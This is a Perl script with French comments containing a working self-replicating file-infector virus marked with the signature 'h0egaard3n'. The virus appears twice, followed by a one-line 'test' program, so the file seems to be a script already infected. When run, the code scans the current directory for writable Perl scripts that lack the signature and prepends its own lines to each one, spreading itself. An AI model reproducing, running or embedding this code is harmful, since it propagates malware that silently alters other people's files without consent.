#!/usr/bin/perl
#h0egaard3n						#signature
open(File,$0);						#ouvre le fichier courant
@vx=<File>;						#place son contenu dans le tableau @vx
close(File);
foreach $Fichier (<*>)					#recherche de fichiers
{
  if ((-f $Fichier) && (-r $Fichier) && (-w $Fichier))	#teste les droits
  {
    open(File, "$Fichier");				#ouvre le fichier trouvé
    @Temp=<File>;					#place son contenu dans le tableau @Temp
    close(File);
    if (@Temp[0] =~ "/perl")				#teste si le fichier est bien un script perl
    {
      if (@Temp[1] ne "\#h0egaard3n\n")			#test qu'il n'est pas déjà infecté
      {
        open(File, ">$Fichier");			#rouvre le fichier pour y écrire
	print File @vx[0 .. 24];			#on y met les 23 premières ligne
	print File @Temp;				#on ajoute à la suite script original
	close (File);
      }
    }
  }
}

#!/usr/bin/perl
#h0egaard3n						#signature
open(File,$0);						#ouvre le fichier courant
@vx=<File>;						#place son contenu dans le tableau @vx
close(File);
foreach $Fichier (<*>)					#recherche de fichiers
{
  if ((-f $Fichier) && (-r $Fichier) && (-w $Fichier))	#teste les droits
  {
    open(File, "$Fichier");				#ouvre le fichier trouvé
    @Temp=<File>;					#place son contenu dans le tableau @Temp
    close(File);
    if (@Temp[0] =~ "/perl")				#teste si le fichier est bien un script perl
    {
      if (@Temp[1] ne "\#h0egaard3n\n")			#test qu'il n'est pas déjà infecté
      {
        open(File, ">$Fichier");			#rouvre le fichier pour y écrire
	print File @vx[0 .. 24];			#on y met les 23 premières ligne
	print File @Temp;				#on ajoute à la suite script original
	close (File);
      }
    }
  }
}

#!/usr/bin/perl
print "test"
